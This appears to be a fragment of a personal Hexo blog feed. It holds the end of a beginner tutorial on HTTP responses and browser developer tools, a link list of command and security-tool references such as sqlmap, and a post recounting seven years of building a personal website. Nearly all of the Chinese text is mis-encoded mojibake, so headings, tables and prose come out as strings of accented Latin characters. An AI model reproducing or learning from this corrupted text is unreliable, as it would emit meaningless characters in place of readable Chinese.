Foundï¼‰ã€‚</p><p>ç¤ºä¾‹ï¼šHTTP&#x2F;1.1 200 OK</p><h3 id="4-2-2-å“åº”å¤´ï¼šå“åº”çš„é™„åŠ ä¿¡æ¯"><a href="#4-2-2-å“åº”å¤´ï¼šå“åº”çš„é™„åŠ ä¿¡æ¯" class="headerlink" title="4.2.2 å“åº”å¤´ï¼šå“åº”çš„é™„åŠ ä¿¡æ¯"></a>4.2.2 å“åº”å¤´ï¼šå“åº”çš„é™„åŠ ä¿¡æ¯</h3><p>å“åº”å¤´ä¹Ÿæ˜¯é”®å€¼å¯¹æ ¼å¼ï¼Œç”¨äºå‘æµè§ˆå™¨ä¼ é€’å“åº”çš„é™„åŠ ä¿¡æ¯ï¼Œå¸®åŠ©æµè§ˆå™¨è§£ææ•°æ®ï¼Œå¸¸è§å“åº”å¤´å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å“åº”å¤´å­—æ®µ</th><th>ä½œç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>Content-Type</td><td>æŒ‡å®šå“åº”ä½“çš„æ•°æ®æ ¼å¼ï¼ˆå¦‚text&#x2F;htmlï¼ˆç½‘é¡µï¼‰ã€application&#x2F;jsonï¼ˆæ¥å£æ•°æ®ï¼‰ã€image&#x2F;jpegï¼ˆå›¾ç‰‡ï¼‰ï¼‰ï¼Œæ˜¯æµè§ˆå™¨è§£ææ•°æ®çš„æ ¸å¿ƒä¾æ®ã€‚</td></tr><tr><td>Content-Length</td><td>æŒ‡å®šå“åº”ä½“çš„å­—èŠ‚å¤§å°ï¼Œå¸®åŠ©æµè§ˆå™¨åˆ¤æ–­æ•°æ®æ˜¯å¦ä¼ è¾“å®Œæ•´ã€‚</td></tr><tr><td>Set-Cookie</td><td>æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½®Cookieï¼ˆå¦‚ç™»å½•åçš„èº«ä»½ä»¤ç‰Œï¼‰ï¼Œåç»­è¯·æ±‚ä¼šè‡ªåŠ¨æºå¸¦ã€‚</td></tr><tr><td>Cache-Control</td><td>æŒ‡å®šå“åº”æ•°æ®çš„ç¼“å­˜ç­–ç•¥ï¼ˆå¦‚max-age&#x3D;3600è¡¨ç¤ºç¼“å­˜1å°æ—¶ï¼‰ï¼Œå‡å°‘é‡å¤è¯·æ±‚ï¼Œæå‡æ€§èƒ½ã€‚</td></tr><tr><td>Location</td><td>é…åˆ3xxé‡å®šå‘çŠ¶æ€ç ä½¿ç”¨ï¼ŒæŒ‡å®šæ–°çš„è·³è½¬URLã€‚</td></tr></tbody></table><h3 id="4-2-3-å“åº”ä½“ï¼šå“åº”çš„æ ¸å¿ƒæ•°æ®"><a href="#4-2-3-å“åº”ä½“ï¼šå“åº”çš„æ ¸å¿ƒæ•°æ®" class="headerlink" title="4.2.3 å“åº”ä½“ï¼šå“åº”çš„æ ¸å¿ƒæ•°æ®"></a>4.2.3 å“åº”ä½“ï¼šå“åº”çš„æ ¸å¿ƒæ•°æ®</h3><p>å“åº”ä½“æ˜¯æœåŠ¡å™¨è¿”å›çš„å…·ä½“å†…å®¹ï¼Œä¹Ÿæ˜¯æµè§ˆå™¨æœ€ç»ˆå‘ˆç°ç»™ç”¨æˆ·çš„â€œåŸææ–™â€ï¼Œå…¶æ ¼å¼ç”±å“åº”å¤´çš„Content-Typeå†³å®šï¼Œå¸¸è§ç±»å‹ï¼š</p><ul><li><p>text&#x2F;htmlï¼šHTMLä»£ç ï¼Œæµè§ˆå™¨è§£æåç”Ÿæˆç½‘é¡µç•Œé¢ã€‚</p></li><li><p>application&#x2F;jsonï¼šJSONæ ¼å¼æ•°æ®ï¼Œå¸¸ç”¨äºå‰åç«¯åˆ†ç¦»é¡¹ç›®çš„æ¥å£å“åº”ï¼ˆå¦‚æ¥å£è¿”å›{â€œcodeâ€:200,â€dataâ€:{â€œnameâ€:â€å¼ ä¸‰â€}}ï¼‰ã€‚</p></li><li><p>image&#x2F;jpegã€image&#x2F;pngï¼šå›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®ï¼Œæµè§ˆå™¨ç›´æ¥æ¸²æŸ“ä¸ºå›¾ç‰‡ã€‚</p></li><li><p>text&#x2F;cssã€application&#x2F;javascriptï¼šCSSæ ·å¼è¡¨ã€JSè„šæœ¬ï¼Œç”¨äºç¾åŒ–é¡µé¢å’Œå®ç°äº¤äº’é€»è¾‘ã€‚</p></li></ul><h1 id="äº”ã€å®æˆ˜ï¼šé€šè¿‡æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹è¯·æ±‚-è¿”å›åŒ…"><a href="#äº”ã€å®æˆ˜ï¼šé€šè¿‡æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹è¯·æ±‚-è¿”å›åŒ…" class="headerlink" title="äº”ã€å®æˆ˜ï¼šé€šè¿‡æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹è¯·æ±‚&#x2F;è¿”å›åŒ…"></a>äº”ã€å®æˆ˜ï¼šé€šè¿‡æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹è¯·æ±‚&#x2F;è¿”å›åŒ…</h1><p>æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼ˆF12æˆ–Ctrl+Shift+Iï¼‰æ˜¯è§‚å¯Ÿè¯·æ±‚åŒ…å’Œè¿”å›åŒ…çš„æœ€ä½³å·¥å…·ï¼Œä»¥Chromeä¸ºä¾‹ï¼Œæ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p>æ‰“å¼€Chromeæµè§ˆå™¨ï¼Œè®¿é—®ç›®æ ‡ç½‘é¡µï¼ˆå¦‚<a href="https://www.baidu.com)./">https://www.baidu.comï¼‰ã€‚</a></p></li><li><p>æŒ‰F12æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåˆ‡æ¢è‡³<strong>Network</strong>ï¼ˆç½‘ç»œï¼‰é¢æ¿ã€‚</p></li><li><p>å‹¾é€‰é¢æ¿å·¦ä¸Šè§’çš„â€œPreserve logâ€ï¼ˆä¿ç•™æ—¥å¿—ï¼‰ï¼Œé¿å…é¡µé¢åˆ·æ–°åè¯·æ±‚ä¸¢å¤±ã€‚</p></li><li><p>åœ¨ç½‘é¡µä¸­è¿›è¡Œæ“ä½œï¼ˆå¦‚è¾“å…¥å…³é”®è¯æœç´¢ï¼‰ï¼ŒNetworké¢æ¿ä¼šæ˜¾ç¤ºæ‰€æœ‰è¯·æ±‚è®°å½•ã€‚</p></li><li><p>ç‚¹å‡»ä»»æ„ä¸€æ¡è¯·æ±‚è®°å½•ï¼Œå³ä¾§ä¼šæ˜¾ç¤ºè¯¥è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼š<br> <strong>Headers</strong>ï¼šæŸ¥çœ‹è¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€å“åº”è¡Œã€å“åº”å¤´ã€‚</p></li><li><p><strong>Payload</strong>ï¼šæŸ¥çœ‹è¯·æ±‚ä½“å‚æ•°ï¼ˆPOSTè¯·æ±‚ï¼‰ã€‚</p></li><li><p><strong>Response</strong>ï¼šæŸ¥çœ‹å“åº”ä½“å†…å®¹ï¼ˆå¦‚HTMLä»£ç ã€JSONæ•°æ®ï¼‰ã€‚</p></li><li><p><strong>Timings</strong>ï¼šæŸ¥çœ‹è¯·æ±‚å„é˜¶æ®µçš„è€—æ—¶ï¼ˆå¦‚DNSè§£æã€TCPè¿æ¥ã€æ•°æ®ä¼ è¾“ï¼‰ã€‚</p></li></ol><p>å®æˆ˜æŠ€å·§ï¼šé€šè¿‡Filterï¼ˆç­›é€‰å™¨ï¼‰è¾“å…¥â€œXHRâ€å¯å¿«é€Ÿå®šä½å¼‚æ­¥è¯·æ±‚ï¼ˆå¦‚AJAXè¯·æ±‚ï¼‰ï¼Œä¾¿äºæŸ¥çœ‹æ¥å£çš„è¯·æ±‚&#x2F;å“åº”æ•°æ®ã€‚</p><h1 id="å…­ã€æ ¸å¿ƒæ€»ç»“"><a href="#å…­ã€æ ¸å¿ƒæ€»ç»“" class="headerlink" title="å…­ã€æ ¸å¿ƒæ€»ç»“"></a>å…­ã€æ ¸å¿ƒæ€»ç»“</h1><ol><li><p>BSæ¶æ„çš„æ ¸å¿ƒæ˜¯â€œæµè§ˆå™¨-æœåŠ¡å™¨â€çš„è¿œç¨‹äº¤äº’ï¼Œä¾èµ–HTTP&#x2F;HTTPSåè®®å®ç°é€šä¿¡ã€‚</p></li><li><p>è¯·æ±‚åŒ…æ˜¯â€œéœ€æ±‚è½½ä½“â€ï¼ŒåŒ…å«è¯·æ±‚è¡Œï¼ˆæ–¹æ³•ã€URLã€ç‰ˆæœ¬ï¼‰ã€è¯·æ±‚å¤´ï¼ˆé™„åŠ ä¿¡æ¯ï¼‰ã€è¯·æ±‚ä½“ï¼ˆå‚æ•°æ•°æ®ï¼‰ï¼Œç”¨äºæ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨â€œè¦ä»€ä¹ˆâ€ã€‚</p></li><li><p>è¿”å›åŒ…æ˜¯â€œç»“æœè½½ä½“â€ï¼ŒåŒ…å«å“åº”è¡Œï¼ˆç‰ˆæœ¬ã€çŠ¶æ€ç ï¼‰ã€å“åº”å¤´ï¼ˆè§£æä¿¡æ¯ï¼‰ã€å“åº”ä½“ï¼ˆæ ¸å¿ƒæ•°æ®ï¼‰ï¼Œç”¨äºå‘Šè¯‰æµè§ˆå™¨â€œå¤„ç†ç»“æœæ˜¯ä»€ä¹ˆâ€ã€‚</p></li><li><p>æµè§ˆå™¨çš„æ ¸å¿ƒä½œç”¨æ˜¯â€œå°è£…è¯·æ±‚+è§£æå“åº”â€ï¼ŒæœåŠ¡å™¨çš„æ ¸å¿ƒä½œç”¨æ˜¯â€œè§£æè¯·æ±‚+ç”Ÿæˆå“åº”â€ï¼ŒäºŒè€…é€šè¿‡è¯·æ±‚åŒ…å’Œè¿”å›åŒ…å®Œæˆé—­ç¯äº¤äº’ã€‚</p><blockquote><p>ï¼ˆæ³¨ï¼šæ–‡æ¡£éƒ¨åˆ†å†…å®¹å¯èƒ½ç”± AI ç”Ÿæˆï¼‰</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸ç”¨èµ„æºæ±‡æ€»</title>
    <link href="/2025/11/01/%E5%B8%B8%E7%94%A8%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/"/>
    <url>/2025/11/01/%E5%B8%B8%E7%94%A8%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="å¸¸ç”¨èµ„æºæ±‡æ€»"><a href="#å¸¸ç”¨èµ„æºæ±‡æ€»" class="headerlink" title="å¸¸ç”¨èµ„æºæ±‡æ€»"></a>å¸¸ç”¨èµ„æºæ±‡æ€»</h1><p>ç”±äºæœ¬äººè„‘å­ä¸å¥½ä½¿ï¼Œç»å¸¸å¿˜ä¸€äº›ä¸œè¥¿ï¼Œæ•…å†™ç¯‡æ–‡ç« æ±‡æ€»ä¸€äº›èµ„æºä»¥ä¾¿éšæ—¶ä½¿ç”¨ã€‚</p><h2 id="å‘½ä»¤ç±»"><a href="#å‘½ä»¤ç±»" class="headerlink" title="å‘½ä»¤ç±»"></a>å‘½ä»¤ç±»</h2><p><a href="https://blog.csdn.net/qq_65810953/article/details/149875496">Git</a><br><a href="https://jamcz.com/tutorial/wanji/">fastboot</a><br><a href="https://www.bilibili.com/opus/511489935913435333">ADB</a> </p><h2 id="å·¥å…·ç±»"><a href="#å·¥å…·ç±»" class="headerlink" title="å·¥å…·ç±»"></a>å·¥å…·ç±»</h2><p><a href="https://blog.csdn.net/m0_60571842/article/details/132402668">Arjun</a></p><p><a href="https://blog.csdn.net/qq_44005305/article/details/146025669">sqlmap</a></p><p><a href="https://github.com/Marven11/FenJing">fenjing</a></p>]]></content>
    
    
    <categories>
      
      <category>æ±‡æ€»</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„ä¸ƒå¹´å»ºç«™ä¹‹è·¯ï¼šä»åˆå…¥æ±Ÿæ¹–åˆ°ç«™ç‚¹ç»ˆæˆ</title>
    <link href="/2025/08/16/%E6%88%91%E7%9A%84%E4%B8%83%E5%B9%B4%E5%BB%BA%E7%AB%99%E4%B9%8B%E8%B7%AF%EF%BC%9A%E4%BB%8E%E5%88%9D%E5%85%A5%E6%B1%9F%E6%B9%96%E5%88%B0%E7%AB%99%E7%82%B9%E7%BB%88%E6%88%90/"/>
    <url>/2025/08/16/%E6%88%91%E7%9A%84%E4%B8%83%E5%B9%B4%E5%BB%BA%E7%AB%99%E4%B9%8B%E8%B7%AF%EF%BC%9A%E4%BB%8E%E5%88%9D%E5%85%A5%E6%B1%9F%E6%B9%96%E5%88%B0%E7%AB%99%E7%82%B9%E7%BB%88%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>2025å¹´8æœˆ9æ—¥ï¼Œæˆ‘æœŸå¾…å·²ä¹…çš„ä¸ªäººåšå®¢ç½‘ç«™ç»ˆäºæ­£å¼è½æˆâ€”â€”ä¹Ÿå°±æ˜¯ä½ æ­¤åˆ»æ­£åœ¨æµè§ˆçš„è¿™ä¸€ä¸ªã€‚å›æœ›è¿™äº›å¹´ä¸ä¸ªäººç½‘ç«™ç›¸ä¼´çš„æ¢ç´¢æ—¶å…‰ï¼Œåˆä¸€é‚£å¹´ç¬¬ä¸€æ¬¡è¾“å…¥ç½‘å€ã€æˆåŠŸæ‰“å¼€å±äºè‡ªå·±ç½‘é¡µæ—¶çš„é›€è·ƒä¸æ¿€åŠ¨ï¼Œè‡³ä»Šä»æ¸…æ™°å¦‚æ˜¨ã€‚è¿™ä»½è·¨è¶Šä¸ƒå¹´çš„çƒ­çˆ±ä¸åšæŒï¼Œå€¼å¾—ç”¨ä¸€ç¯‡æ–‡å­—è®°å½•ä¸‹æ¥ï¼Œä¸æ¯ä¸€ä½åŒæ ·å¯¹å»ºç«™æ„Ÿå…´è¶£çš„æœ‹å‹åˆ†äº«æˆ‘çš„æˆé•¿ä¸æ„Ÿæ‚Ÿã€‚</p><h2 id="åˆå‡ºèŒ…åºï¼šHTML-Github-Pagesï¼Œæ‰‹å†™ä»£ç çš„çº¯ç²¹çƒ­çˆ±"><a href="#åˆå‡ºèŒ…åºï¼šHTML-Github-Pagesï¼Œæ‰‹å†™ä»£ç çš„çº¯ç²¹çƒ­çˆ±" class="headerlink" title="åˆå‡ºèŒ…åºï¼šHTML+Github Pagesï¼Œæ‰‹å†™ä»£ç çš„çº¯ç²¹çƒ­çˆ±"></a>åˆå‡ºèŒ…åºï¼šHTML+Github Pagesï¼Œæ‰‹å†™ä»£ç çš„çº¯ç²¹çƒ­çˆ±</h2><p>åˆä¸€åˆšæ¥è§¦HTMLæ—¶ï¼Œæˆ‘æ›¾ä¸ºä¸€ä¸ªé—®é¢˜å›°æƒ‘è®¸ä¹…ï¼šæ˜æ˜ç…§ç€ä¹¦å†™å¥½äº†ç½‘é¡µä»£ç ï¼Œå´å§‹ç»ˆä¸çŸ¥é“æ€æ ·æ‰èƒ½è®©å®ƒå˜æˆâ€œè¾“å…¥ç½‘å€å°±èƒ½è®¿é—®â€çš„æ ·å­ã€‚ç›´åˆ°åæ¥æ‰æ˜ç™½ï¼Œæƒ³è¦è®©ç½‘é¡µè¢«ä»–äººçœ‹åˆ°ï¼Œå¿…é¡»æ­å»ºå±äºè‡ªå·±çš„æœåŠ¡å™¨ã€‚</p><p>é‚£æ—¶çš„æˆ‘æ—¢æ²¡æœ‰é¢å¤–çš„é¢„ç®—ï¼Œä¹Ÿä¸æ‡‚æœåŠ¡å™¨é…ç½®ï¼Œå¶ç„¶å‘ç°çš„Github Pagesæˆäº†æœ€ä½³é€‰æ‹©â€”â€”æ— éœ€ä»˜è´¹ï¼Œä¹Ÿä¸ç”¨å¤æ‚è®¾ç½®ï¼Œå°±èƒ½è®©é™æ€ç½‘é¡µä¸Šçº¿ã€‚æˆ‘çš„ç¬¬ä¸€ä¸ªâ€œå¯è®¿é—®ç½‘ç«™â€ï¼Œå°±æ˜¯é ç€â€œæ‰‹æ“HTMLæ–‡ä»¶â€ä¸€ç‚¹ç‚¹å®Œæˆçš„ï¼šä»è°ƒæ•´æ ‡ç­¾ç»“æ„åˆ°ä¿®æ”¹æ ·å¼ï¼Œæ¯ä¸€è¡Œä»£ç éƒ½è¦æ‰‹åŠ¨æ•²å†™ï¼Œè¿‡ç¨‹ç¹çå´å……æ»¡æˆå°±æ„Ÿã€‚å½“ç»ˆäºèƒ½åœ¨æµè§ˆå™¨è¾“å…¥ç½‘å€ï¼Œçœ‹åˆ°è‡ªå·±å†™çš„é¡µé¢åŠ è½½å‡ºæ¥æ—¶ï¼Œé‚£ç§çº¯ç²¹çš„æ»¡è¶³æ„Ÿï¼Œæˆäº†æˆ‘åšæŒå»ºç«™çš„æœ€åˆåŠ¨åŠ›ã€‚</p><h2 id="å´­éœ²å¤´è§’ï¼šWordPress-æœåŠ¡å™¨ï¼Œè§£é”â€œå¯è§†åŒ–â€å»ºç«™"><a href="#å´­éœ²å¤´è§’ï¼šWordPress-æœåŠ¡å™¨ï¼Œè§£é”â€œå¯è§†åŒ–â€å»ºç«™" class="headerlink" title="å´­éœ²å¤´è§’ï¼šWordPress+æœåŠ¡å™¨ï¼Œè§£é”â€œå¯è§†åŒ–â€å»ºç«™"></a>å´­éœ²å¤´è§’ï¼šWordPress+æœåŠ¡å™¨ï¼Œè§£é”â€œå¯è§†åŒ–â€å»ºç«™</h2><p>åˆä¸‰æ—¶ï¼Œä¸€æ¬¡å¶ç„¶çš„æœºä¼šï¼Œå­¦æ ¡ç¤¾å›¢ç§Ÿç”¨äº†ä¸€å°äºšé©¬é€Šäº‘æœåŠ¡å™¨ã€‚å¯¹å»ºç«™æ—©å·²ç—´è¿·çš„æˆ‘ï¼Œè‡ªç„¶ä¸ä¼šé”™è¿‡è¿™ä¸ªâ€œå‡çº§è£…å¤‡â€çš„æœºä¼šâ€”â€”è¿™æ¬¡æˆ‘é€‰æ‹©äº†WordPressï¼ˆåç«¯ç”±å¥½å‹libfsxååŠ©æ­å»ºï¼‰ï¼Œå½»åº•å‘Šåˆ«äº†â€œçº¯æ‰‹å†™ä»£ç â€çš„æ—¶ä»£ã€‚</p><p>ç›¸æ¯”äºéœ€è¦é€è¡Œç¼–å†™çš„HTMLï¼ŒWordPressçš„ä¼˜åŠ¿æ˜¾è€Œæ˜“è§ï¼šå®ƒè‡ªå¸¦æˆç†Ÿçš„åšå®¢æ¡†æ¶ï¼Œæ— éœ€ä»é›¶å¼€å‘ï¼›é€šè¿‡åå°å°±èƒ½è½»æ¾é…ç½®ä¸»é¢˜ã€å®‰è£…æ’ä»¶ï¼Œæ— è®ºæ˜¯è°ƒæ•´é¡µé¢é£æ ¼ï¼Œè¿˜æ˜¯æ·»åŠ è¯„è®ºã€ç»Ÿè®¡ç­‰åŠŸèƒ½ï¼Œéƒ½èƒ½â€œå¯è§†åŒ–æ“ä½œâ€ï¼›æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒæ­è½½äº†è´¦å·ç³»ç»Ÿå’Œæ•°æ®åº“â€”â€”ç®¡ç†å‘˜ä¸ç”¨ç™»å½•æœåŠ¡å™¨ï¼Œåœ¨å‰ç«¯åå°å°±èƒ½ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼›è¿˜èƒ½ç»™æœ‹å‹å¼€æ”¾â€œä½œè€…è´¦å·â€ï¼Œè®©ä»–ä»¬ä¸€èµ·å‘æ–‡ï¼›æ™®é€šæ¸¸å®¢ä¹Ÿèƒ½æ³¨å†Œè´¦å·ç•™è¨€äº’åŠ¨ã€‚</p><p><img src="https://pic1.imgdb.cn/item/68a1e04d58cb8da5c82b2441.png" alt="å½“å¹´æ²¡æˆªå›¾ï¼Œè¿™é‡Œç”¨lovestuçš„ç½‘ç«™æ¼”ç¤ºä¸€ä¸‹WordPress"></p><p>ä¸è¿‡ï¼Œå¥½æ™¯ä¸é•¿â€”â€”äº‘æœåŠ¡å™¨çš„è´¹ç”¨å¹¶ä¸ä½ï¼Œåæ¥æˆ‘åˆå°è¯•è¿‡è™šæ‹Ÿä¸»æœºã€å®ä½“ä¸»æœº+å†…ç½‘ç©¿é€ï¼Œä½†å¯¹äºä¸€ä¸ªâ€œæ²¡ä»€ä¹ˆè®¿é—®é‡ã€çº¯å±è‡ªå¨±è‡ªä¹â€çš„ä¸ªäººåšå®¢æ¥è¯´ï¼Œè¿™äº›æ–¹æ¡ˆè¦ä¹ˆæˆæœ¬å¤ªé«˜ï¼Œè¦ä¹ˆé…ç½®å¤æ‚ã€‚æœ€ç»ˆï¼Œå†æ—¶ä¸¤å¹´çš„WordPressæ¢ç´¢ä¹‹è·¯ï¼Œè¿˜æ˜¯é—æ†¾åœ°å‘Šä¸€æ®µè½ã€‚</p><h2 id="é©¾è½»å°±ç†Ÿï¼šHexo-Github-Pagesï¼Œå›å½’è½»é‡åŒ–åˆ›ä½œ"><a href="#é©¾è½»å°±ç†Ÿï¼šHexo-Github-Pagesï¼Œå›å½’è½»é‡åŒ–åˆ›ä½œ" class="headerlink" title="é©¾è½»å°±ç†Ÿï¼šHexo+Github Pagesï¼Œå›å½’è½»é‡åŒ–åˆ›ä½œ"></a>é©¾è½»å°±ç†Ÿï¼šHexo+Github Pagesï¼Œå›å½’è½»é‡åŒ–åˆ›ä½œ</h2><p>ä¸­è€ƒç»“æŸåï¼Œç»ˆäºæœ‰äº†å¤§æŠŠæ—¶é—´ç ”ç©¶å»ºç«™ã€‚è¿™æ—¶ï¼Œå¥½å‹libfsxç»™æˆ‘æ¨èäº†Hexoâ€”â€”ä¸€ä¸ªè½»é‡çº§çš„é™æ€åšå®¢æ¡†æ¶ã€‚ä¸€è¯•ä¹‹ä¸‹ï¼Œæˆ‘ä¾¿ç«‹åˆ»è¢«å®ƒå¸å¼•ï¼Œä¹Ÿç”±æ­¤å¼€å¯äº†<a href="bobrocket.github.io">è½¯æ ¸å®éªŒå®¤</a>è¿™ä¸ªç«™ç‚¹çš„é›å½¢ã€‚</p><p>ç›¸æ¯”äºWordPressçš„â€œå…¨èƒ½å‹â€ï¼ŒHexoçš„â€œè½»é‡åŒ–â€æ°å¥½å¥‘åˆäº†æˆ‘çš„éœ€æ±‚ï¼šå®ƒé‡‡ç”¨â€œæºç +è¾“å‡ºHTMLâ€çš„æ¨¡å¼ï¼Œæœ¬åœ°å†™å®Œå†…å®¹åï¼Œåªéœ€ä¸€æ¡å‘½ä»¤å°±èƒ½å°†ç”Ÿæˆçš„é™æ€æ–‡ä»¶éƒ¨ç½²åˆ°Github Pagesä¸Šï¼Œæ— éœ€ç»´æŠ¤æ•°æ®åº“ï¼ŒåŠ è½½é€Ÿåº¦æ›´å¿«ï¼›æ›´é‡è¦çš„æ˜¯ï¼ŒHexoæ”¯æŒMarkdownè¯­æ³•â€”â€”å¯¹äºä¹ æƒ¯ç”¨Markdownå†™ç¬”è®°ã€è®°æ€è·¯çš„æˆ‘æ¥è¯´ï¼Œç”¨å®ƒå†™åšå®¢å°±åƒâ€œå†™ç¬”è®°ä¸€æ ·è½»æ¾â€ï¼Œä¸ç”¨å†æ“å¿ƒæ’ç‰ˆï¼Œä¸“æ³¨äºå†…å®¹æœ¬èº«å³å¯ã€‚è¿™ç§â€œå›å½’åˆ›ä½œæœ¬è´¨â€çš„ä½“éªŒï¼Œè®©æˆ‘åœ¨å»ºç«™è¿™ä»¶äº‹ä¸Šï¼Œç¬¬ä¸€æ¬¡æœ‰äº†â€œé©¾è½»å°±ç†Ÿâ€çš„æ„Ÿè§‰ã€‚</p><p><img src="https://pic1.imgdb.cn/item/68a1df8958cb8da5c82b2406.png" alt="è½¯æ ¸å®éªŒå®¤"></p><h2 id="ç‚‰ç«çº¯é’ï¼šHexo-EdgeOneï¼Œè§£å†³è®¿é—®é€Ÿåº¦â€œæœ€åä¸€å…¬é‡Œâ€"><a href="#ç‚‰ç«çº¯é’ï¼šHexo-EdgeOneï¼Œè§£å†³è®¿é—®é€Ÿåº¦â€œæœ€åä¸€å…¬é‡Œâ€" class="headerlink" title="ç‚‰ç«çº¯é’ï¼šHexo+EdgeOneï¼Œè§£å†³è®¿é—®é€Ÿåº¦â€œæœ€åä¸€å…¬é‡Œâ€"></a>ç‚‰ç«çº¯é’ï¼šHexo+EdgeOneï¼Œè§£å†³è®¿é—®é€Ÿåº¦â€œæœ€åä¸€å…¬é‡Œâ€</h2><p>æœ¬ä»¥ä¸ºHexo+Github Pagesçš„ç»„åˆå·²ç»è¶³å¤Ÿå®Œç¾ï¼Œç›´åˆ°ä¸€æ¬¡æ„å¤–æ‰“ä¹±äº†èŠ‚å¥â€”â€”å› ä¸ºæ‰‹æœºåˆ·æœºã€ç”µè„‘ç³»ç»Ÿé‡è£…ï¼Œæˆ‘ä¸å°å¿ƒå¼„ä¸¢äº†Githubè´¦å·çš„ä¸¤æ­¥éªŒè¯ç ï¼Œä¹‹å‰çš„ç«™ç‚¹é…ç½®ä¹Ÿéšä¹‹ä¸¢å¤±ã€‚æ— å¥ˆä¹‹ä¸‹ï¼Œåªèƒ½â€œæ¨å€’é‡æ¥â€ã€‚</p><p>ä½†è¿™æ¬¡é‡å»ºï¼Œæˆ‘ä¸æƒ³åªåšâ€œç®€å•å¤åˆ»â€â€”â€”ä¸€ç›´ä»¥æ¥ï¼ŒGithub Pagesåœ¨å›½å†…çš„è®¿é—®é€Ÿåº¦è¾ƒæ…¢ï¼Œè¿™æ˜¯æˆ‘å¿ƒä¸­çš„ä¸€ä¸ªå°é—æ†¾ã€‚äºæ˜¯ï¼Œåœ¨é‡æ–°æ­å»ºç«™ç‚¹æ—¶ï¼Œæˆ‘æŠŠâ€œæé€Ÿâ€ä½œä¸ºæ ¸å¿ƒç›®æ ‡ã€‚ä¸€ç•ªç ”ç©¶åï¼Œæˆ‘å°†ç›®å…‰æŠ•å‘äº†è…¾è®¯äº‘çš„EdgeOneï¼šåŸæœ¬åªæ˜¯æƒ³è¯•è¯•å®ƒçš„CDNåŠ é€ŸåŠŸèƒ½ï¼Œå´æ„å¤–å‘ç°äº†â€œEdgeOne Pagesâ€è¿™ä¸ªæ–°ç‰¹æ€§â€”â€”å®ƒèƒ½å°†é™æ€èµ„æºéƒ¨ç½²åˆ°è…¾è®¯äº‘çš„è¾¹ç¼˜èŠ‚ç‚¹ï¼Œç”¨æˆ·è®¿é—®æ—¶ä¼šè‡ªåŠ¨åŒ¹é…æœ€è¿‘çš„èŠ‚ç‚¹åŠ è½½å†…å®¹ï¼Œç½‘é¡µå“åº”é€Ÿåº¦æ¯”å•çº¯ç”¨Github Pageså¿«äº†ä¸æ­¢ä¸€ä¸ªæ¡£æ¬¡ã€‚</p><p><img src="https://pic1.imgdb.cn/item/68a1df2c58cb8da5c82b23ed.png" alt="è…¾è®¯äº‘çš„æ§åˆ¶å°"></p><p>ä»â€œè§£å†³è®¿é—®é—®é¢˜â€åˆ°â€œä¼˜åŒ–ä½“éªŒç»†èŠ‚â€ï¼Œè¿™æ¬¡é‡å»ºä¸ä»…è®©æˆ‘æ‰¾å›äº†ä¹‹å‰çš„ç«™ç‚¹å†…å®¹ï¼Œæ›´è®©æˆ‘çš„å»ºç«™æ€è·¯ä»â€œèƒ½ç”¨å°±è¡Œâ€å‡çº§åˆ°â€œå¥½ç”¨ã€æ˜“ç”¨â€ã€‚å½“çœ‹åˆ°æ–°ç«™ç‚¹åœ¨æ‰‹æœºã€ç”µè„‘ä¸Šéƒ½èƒ½å¿«é€ŸåŠ è½½ï¼Œä¹‹å‰çš„é—æ†¾å½»åº•è¢«å¼¥è¡¥æ—¶ï¼Œæˆ‘æ‰çœŸæ­£è§‰å¾—ï¼Œæˆ‘çš„ä¸ƒå¹´å»ºç«™ä¹‹è·¯ï¼Œç»ˆäºèµ°åˆ°äº†â€œç‚‰ç«çº¯é’â€çš„é˜¶æ®µã€‚</p><h2 id="ç»“å°¾"><a href="#ç»“å°¾" class="headerlink" title="ç»“å°¾"></a>ç»“å°¾</h2><p>å›æœ›è¿™ä¸ƒå¹´çš„å»ºç«™ä¹‹è·¯ï¼Œä»åˆä¸€ç¬¬ä¸€æ¬¡æ•²å†™HTMLçš„æ‡µæ‡‚ï¼Œåˆ°å¦‚ä»Šç«™ç‚¹ç»ˆæˆçš„ä»å®¹ï¼Œæ¯ä¸€æ­¥éƒ½ç¦»ä¸å¼€èº«è¾¹æœ‹å‹çš„æ”¯æŒã€‚ç‰¹åˆ«æ„Ÿè°¢<a href="https://blog.libfsx.org/">libfsx</a>â€”â€”æ— è®ºæ˜¯æœ€åˆçš„WordPressåç«¯æ­å»ºï¼Œè¿˜æ˜¯åæ¥æ¨èHexoï¼Œä»–éƒ½ç»™äº†æˆ‘å¤ªå¤šæŠ€æœ¯ä¸Šçš„å¸®åŠ©ï¼›æ„Ÿè°¢å¢æˆ¦å’ŒWingÂ·FrancisÂ·Smithï¼Œåœ¨æˆ‘é‡åˆ°éš¾é¢˜æ—¶è€å¿ƒå€¾å¬ã€é™ªæˆ‘ä¸€èµ·æ’æŸ¥é—®é¢˜ã€‚</p><p>æ²¡æœ‰ä½ ä»¬çš„é™ªä¼´ä¸æ”¯æŒï¼Œå°±æ²¡æœ‰ä»Šå¤©è¿™ä¸ªâ€œsunyâ€çš„ä¸ªäººåšå®¢ã€‚è€Œè¿™ä»½ä¸ä»£ç 